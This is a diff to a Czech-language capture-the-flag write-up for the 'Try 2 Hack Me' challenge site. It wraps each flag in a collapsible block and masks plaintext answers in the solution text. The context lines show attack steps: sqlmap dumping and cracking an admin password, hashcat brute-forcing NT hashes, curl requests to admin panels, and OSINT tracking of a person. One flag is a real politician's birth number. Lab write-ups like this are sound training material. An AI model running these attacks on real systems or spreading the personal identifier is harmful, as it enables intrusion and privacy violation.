@@ -2,7 +2,6 @@
 **[Try 2 Hack Me](https://try2hack.me)**
 
 ---
----
 
 ## Úkol č. 1
 
@@ -51,13 +50,14 @@ secretsubdom.try2hack.me
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 secretsubdom
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 2
@@ -76,13 +76,14 @@ $6$VQoztKJH$0aL8rygMd8gfX7m8cTRWOn4pqQ6bA/jkPyQSnzU0g10E0UiMQjIijs/66vflY7cMrGSK
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 temp
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 3
@@ -103,13 +104,14 @@ curl -x 41.135.120.70:8080 -L https://try2hack.me/AdminPanel.php
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 Wi3ft0Wpizh8cV
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 4
@@ -195,13 +197,14 @@ root@kali:~# curl http://127.0.0.1:8000/server-status
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 31.31.76.46
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 5
@@ -261,18 +264,19 @@ hashcat -m 1000 -w 3 -o found.txt -a 3 --username NT_hash.txt -1 ?l?d?u ?1?1?1?1
 And after few hours we get:
 
 ```
-179ba8ef1a67098d535c72de9901a0b8:d7Mus1fH
+179ba8ef1a67098d535c72de9901a0b8:********
 ```
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 d7Mus1fH
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 6
@@ -302,13 +306,14 @@ function find-subdomain() {
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 Bir63Fpw0d9MX
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 7
@@ -325,13 +330,14 @@ Tajné heslo se shoduje s rodným číslem prezidenta České republiky Miloše 
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 440928/086
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 8
@@ -347,13 +353,14 @@ Pro přihlášení do interního systému napadené společnosti je použita uti
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 temp
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 9
@@ -366,17 +373,18 @@ Tajné heslo pro splnění tohoto úkolu je stejné, jako anglicky psané město
 
 ### Postup řešení
 
-Putting the name into [facebook](https://www.facebook.com/) returned `Jason Macrapatulos's` profile (currently defunct), which contained link to his twitter account [JasonMacra](https://twitter.com/JasonMacra). This contained post with the picture of his house. After clicking on the date at the tweet, [the detailed tweet view](./09/JasonMacra_twitter.png) revealed name of the city - `Brudges`.
+Putting the name into [facebook](https://www.facebook.com/) returned `Jason Macrapatulos's` profile (currently defunct), which contained link to his twitter account [JasonMacra](https://twitter.com/JasonMacra). This contained post with the picture of his house. After clicking on the date at the tweet, [the detailed tweet view](./09/JasonMacra_twitter.png) revealed name of the city - `*******`.
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 Brudges
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 10
@@ -395,13 +403,14 @@ tshark -O SIP -nr ./netdump.pcap -qx | grep -A 2 -B 1 s.w.o.r.d | tr -d '.' | se
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 mNhr6sW9cs0sD4sVoVpwjf6C
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 11
@@ -422,13 +431,14 @@ curl https://admin:falcon@try2hack.me/manage/
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 Veinsg5Vskg2Fpcb
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 12
@@ -485,19 +495,20 @@ nascetur ridiculus mus. Mauris malesuada ultrices
 [XORing](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Latin1','string':'nascetur%20ridiculus%20mus.%20Mauris%20malesuada%20ultrices'%7D,'Standard',false)&input=MjYwNDEgZjBmMGEgNTQxNzAgMDRmMDYgMDEwMTEgYjRmNTUgMTgxZDEgNjAwMWQgMTQwMDUgZDU3MjIKMTMxMTUgMjAwMDAgMDAyOTAgZDFiMGIgMTE0MDEgOTFjMjkgNDkwMjQgMjU0MzMgMDEwZTAgMDE3) cypher text with the whole key returns whole decrypted message:
 
 ```
-Hello brother, the password is Dlwnb5xxHiw. Ahmed
+Hello brother, the password is ***********. Ahmed
 ```
 
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 Dlwnb5xxHiw
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 13
@@ -517,13 +528,14 @@ grep -A5 -R -i pass ./findmypass.apk.src/ | grep -i '"'
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 Secure1369Pass
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 14
@@ -544,13 +556,14 @@ sudo umount ./tmp
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 Ciw27xDowP20eXnv
 ```
 
----
+</details>
+
 ---
 
 ## Úkol č. 15
@@ -605,22 +618,23 @@ sqlmap -u "https://try2hack.me/a/1*" --random-agent --level 5 --risk 3 -D produc
 While dumping the table SQLmap detects hash in password column for the only user `admin` and offers to run dictionary attack against it, and voila:
 
 ```bash
-[15:36:15] [INFO] cracked password 'Password123' for user 'admin'
+[15:36:15] [INFO] cracked password '***********' for user 'admin'
 Database: production
 Table: users
 [1 entry]
 +----+-------+-------+--------+------------------------------------------------+
 | id | name  | login | active | password                                       |
 +----+-------+-------+--------+------------------------------------------------+
-| 1  | Admin | admin | 1      | 42f749ade7f9e195bf475f37a44cafcb (Password123) |
+| 1  | Admin | admin | 1      | 42f749ade7f9e195bf475f37a44cafcb (***********) |
 +----+-------+-------+--------+------------------------------------------------+
 ```
 
 ---
 
-### Flag:
+<details><summary>FLAG:</summary>
 
 ```
 Password123
 ```
 
+</details>
